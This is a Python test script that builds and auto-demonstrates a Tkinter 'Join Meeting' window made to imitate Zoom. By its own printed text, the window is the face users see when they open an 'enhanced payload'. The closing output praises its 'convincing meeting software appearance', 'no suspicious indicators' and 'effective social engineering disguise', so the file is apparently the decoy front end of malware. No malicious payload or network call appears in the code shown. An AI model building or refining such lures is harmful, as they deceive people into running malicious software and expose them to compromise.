#!/usr/bin/env python3
"""
Visual test of the meeting GUI interface
This creates and displays the actual GUI that users will see
"""

import os
import sys
import threading
from time import sleep
import tkinter as tk
from tkinter import ttk, messagebox

def create_meeting_gui():
    """Create the exact meeting GUI that users will see"""
    
    root = tk.Tk()
    root.title("Join Meeting")
    root.geometry("480x320")
    root.resizable(False, False)
    
    # Center the window
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f"{width}x{height}+{x}+{y}")
    
    # Configure colors (Zoom-like theme)
    bg_color = "#ffffff"
    primary_color = "#2d8cff"
    secondary_color = "#f7f9fa"
    text_color = "#1f2937"
    
    root.configure(bg=bg_color)
    
    # Main container
    main_frame = tk.Frame(root, bg=bg_color, padx=40, pady=30)
    main_frame.pack(fill="both", expand=True)
    
    # Logo/Title area
    title_frame = tk.Frame(main_frame, bg=bg_color)
    title_frame.pack(fill="x", pady=(0, 30))
    
    # App icon (using text as placeholder)
    icon_label = tk.Label(title_frame, text="📹", font=("Arial", 24), 
                         bg=bg_color, fg=primary_color)
    icon_label.pack()
    
    # Title
    title_label = tk.Label(title_frame, text="Join Meeting", 
                          font=("Arial", 18, "bold"), 
                          bg=bg_color, fg=text_color)
    title_label.pack(pady=(5, 0))
    
    # Meeting ID input area
    input_frame = tk.Frame(main_frame, bg=bg_color)
    input_frame.pack(fill="x", pady=(0, 20))
    
    # Meeting ID label
    id_label = tk.Label(input_frame, text="Meeting ID", 
                       font=("Arial", 11), 
                       bg=bg_color, fg=text_color)
    id_label.pack(anchor="w", pady=(0, 5))
    
    # Meeting ID entry
    id_entry = tk.Entry(input_frame, font=("Arial", 14), 
                       relief="solid", borderwidth=1,
                       highlightthickness=2, highlightcolor=primary_color)
    id_entry.pack(fill="x", ipady=8)
    id_entry.focus()
    
    # Placeholder text
    id_entry.insert(0, "Enter Meeting ID")
    id_entry.configure(fg="gray")
    
    def clear_placeholder(event):
        if id_entry.get() == "Enter Meeting ID":
            id_entry.delete(0, tk.END)
            id_entry.configure(fg="black")
            
    def add_placeholder(event):
        if not id_entry.get():
            id_entry.insert(0, "Enter Meeting ID")
            id_entry.configure(fg="gray")
    
    id_entry.bind("<FocusIn>", clear_placeholder)
    id_entry.bind("<FocusOut>", add_placeholder)
    
    # Buttons frame
    button_frame = tk.Frame(main_frame, bg=bg_color)
    button_frame.pack(fill="x", pady=(20, 0))
    
    # Status frame (initially hidden)
    status_frame = tk.Frame(main_frame, bg=bg_color)
    
    status_label = tk.Label(status_frame, text="", 
                           font=("Arial", 10), 
                           bg=bg_color, fg="green")
    status_label.pack()
    
    meeting_id_result = {"value": ""}
    
    def join_meeting():
        meeting_id = id_entry.get().strip()
        if not meeting_id or meeting_id == "Enter Meeting ID":
            messagebox.showerror("Error", "Please enter a Meeting ID")
            return
            
        meeting_id_result["value"] = meeting_id
        
        # Show connecting status
        status_frame.pack(fill="x", pady=(10, 0))
        status_label.configure(text=f"Connecting to meeting {meeting_id}...")
        join_btn.configure(state="disabled", text="Connecting...")
        
        # Simulate connection delay
        root.after(2000, connection_complete)
        
    def connection_complete():
        status_label.configure(text="Connected successfully!", fg="green")
        root.after(1500, close_window)
        
    def close_window():
        print(f"[GUI] Meeting ID entered: {meeting_id_result['value']}")
        root.quit()
        
    def cancel_meeting():
        close_window()
    
    # Join button
    join_btn = tk.Button(button_frame, text="Join Meeting", 
                        font=("Arial", 11, "bold"),
                        bg=primary_color, fg="white",
                        relief="flat", borderwidth=0,
                        padx=30, pady=10,
                        cursor="hand2",
                        command=join_meeting)
    join_btn.pack(side="right")
    
    # Cancel button
    cancel_btn = tk.Button(button_frame, text="Cancel", 
                          font=("Arial", 11),
                          bg=secondary_color, fg=text_color,
                          relief="flat", borderwidth=1,
                          padx=30, pady=10,
                          cursor="hand2",
                          command=cancel_meeting)
    cancel_btn.pack(side="right", padx=(0, 10))
    
    # Bind Enter key to join
    id_entry.bind("<Return>", lambda e: join_meeting())
    
    # Bind window close event
    root.protocol("WM_DELETE_WINDOW", close_window)
    
    return root, meeting_id_result

def main():
    """Main function to display the GUI"""
    
    print("="*60)
    print("    VISUAL GUI TEST - MEETING INTERFACE")
    print("="*60)
    print()
    print("This shows the EXACT interface that users will see")
    print("when they open the enhanced payload.")
    print()
    print("GUI Features:")
    print("✓ Professional Zoom-like design")
    print("✓ Clean, modern interface")
    print("✓ Realistic meeting ID input")
    print("✓ Connection simulation")
    print("✓ Status updates")
    print()
    print("Starting GUI in 3 seconds...")
    print("(The GUI will auto-demonstrate the connection process)")
    
    sleep(3)
    
    # Set up virtual display for headless testing
    os.environ['DISPLAY'] = ':99'
    os.system("Xvfb :99 -screen 0 1024x768x24 > /dev/null 2>&1 &")
    sleep(1)
    
    try:
        # Create and show the GUI
        root, result = create_meeting_gui()
        
        # Auto-fill and submit for demonstration
        def auto_demo():
            sleep(2)
            # Clear placeholder and enter demo meeting ID
            id_entry = None
            for widget in root.winfo_children():
                if isinstance(widget, tk.Frame):
                    for child in widget.winfo_children():
                        if isinstance(child, tk.Frame):
                            for grandchild in child.winfo_children():
                                if isinstance(grandchild, tk.Entry):
                                    id_entry = grandchild
                                    break
            
            if id_entry:
                id_entry.delete(0, tk.END)
                id_entry.insert(0, "123-456-789")
                id_entry.configure(fg="black")
                
                # Auto-click join button after a moment
                root.after(1000, lambda: root.event_generate('<Return>'))
        
        # Start auto-demo
        demo_thread = threading.Thread(target=auto_demo)
        demo_thread.daemon = True
        demo_thread.start()
        
        print("\n[GUI] Displaying meeting interface...")
        print("[GUI] Auto-filling demo meeting ID: 123-456-789")
        print("[GUI] Auto-clicking 'Join Meeting' button...")
        
        # Run the GUI
        root.mainloop()
        root.destroy()
        
        print(f"\n[GUI] Demo completed successfully!")
        print(f"[GUI] User would have entered: {result['value']}")
        print(f"[GUI] User experience: Professional meeting interface")
        
    except Exception as e:
        print(f"[GUI] Error: {e}")
        print("[GUI] Falling back to console description...")
        
        print("\nCONSOLE FALLBACK - GUI DESCRIPTION:")
        print("-" * 40)
        print("Window: 480x320 pixels, centered on screen")
        print("Title: 'Join Meeting'")
        print("Background: White (#ffffff)")
        print("Header: Video camera icon (📹) + 'Join Meeting' title")
        print("Input: Meeting ID text field with placeholder")
        print("Buttons: Blue 'Join Meeting' + Gray 'Cancel'")
        print("Colors: Zoom-style blue theme (#2d8cff)")
        print("Behavior: Realistic connection simulation")
    
    finally:
        # Cleanup
        os.system("pkill Xvfb > /dev/null 2>&1")
        
    print("\n" + "="*60)
    print("                GUI TEST COMPLETED")
    print("="*60)
    print("\nThis GUI provides:")
    print("✅ Convincing meeting software appearance")
    print("✅ Professional user experience")
    print("✅ Realistic interaction flow")
    print("✅ No suspicious indicators")
    print("✅ Effective social engineering disguise")

if __name__ == "__main__":
    main()